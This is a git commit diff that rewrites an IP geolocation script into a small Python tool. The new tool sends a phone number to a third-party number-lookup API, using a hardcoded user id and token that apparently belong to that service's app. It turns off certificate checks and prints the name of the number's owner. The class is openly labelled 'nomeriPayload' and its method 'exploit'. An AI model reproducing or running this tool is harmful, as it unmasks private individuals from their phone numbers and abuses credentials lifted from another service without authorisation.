cf8bda4f42ffb53280be20663c751afb2c83b659
Nikoloz Chitashvili <nika@wifisher.com>
2018-09-07 12:44:40 +0400

    Rewritten in OOP

--- locator.py
+++ locator.py
@@ -1,45 +1,31 @@
-import sys, socket, pygeoip, argparse
+import requests
+import json
+import urllib3, argparse
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
+class nomeriPayload:
+    def __init__(self, number):
+        self.number = number
 
-class Locator(object):
-    def __init__(self, url=False, ip=False, datfile=False):
-        self.url = url
-        self.ip = ip
-        self.datfile = datfile
-        self.target = ''
+    def exploit(self):
+        post_me = {
+            'number': self.number,
+            'u_uid': 59281,
+            'u_token': 'ThwcqtX7BcVTS3UZuB9nkegAwlc4JV'
+        }
 
-    def query(self):
+        url = 'https://simpleapi.info/apps/numbers-info/info.php?log_note=nomrebi.com'
+        get_num = requests.post(url, data=post_me, verify=False)
         try:
-            if not self.datfile:
-                # .dat default file path goes here, for me it's
-                self.datfile = 'N:\\Tools\\IP Locator\\GeoLiteCity.dat'
-            if not not self.url:
-                print('[*] Translating %s' % (self.url))
-                try:
-                    self.target += socket.gethostbyname(self.url)
-                    print(self.target)
-                except Exception:
-                    print('\n[!] Failed to Resolve URL')
-                    return
-            else:
-                self.target += self.ip
-            print('[*] Querying for Records of %s...\n' % (self.target))
-            query_obj = pygeoip.GeoIP(self.datfile)
-            for key, val in query_obj.record_by_addr(self.target).items():
-                print('%s: %s' % (key, val))
-            print('\n[*] Query Complete!')
-        except Exception as e:
-            print('\n[*] Error Occured: %s' % (e))
-            sys.exit(-1)
-
-
-
+            if json.loads(get_num.content)['err']:
+                pass
+        except KeyError:
+            print("Number:", self.number, "| Name:", json.loads(get_num.content)['info']['name'])
 
 if __name__ == '__main__':
-    parser = argparse.ArgumentParser(description='IP Locator Software')
-    parser.add_argument('-u', '--url', help='Locate an IP on a URL', action='store', default=False, dest='url')
-    parser.add_argument('-t', '--target', help='Locate The Specified IP', action='store', default=False, dest='ip')
-    parser.add_argument('-d', '--dat', help='Custom database filepath', action='store', default=False, dest='datfile')
+    parser = argparse.ArgumentParser(description='Grab Data From nomrebi.com API by just number')
+    parser.add_argument('-n', '--num', help='Phone Number', required=True, dest='number')
     args = parser.parse_args()
-    gela = Locator(url=args.url, ip=args.ip, datfile=args.datfile)
-    gela.query()
+
+    work_payload = nomeriPayload(number=args.number)
+    work_payload.exploit()
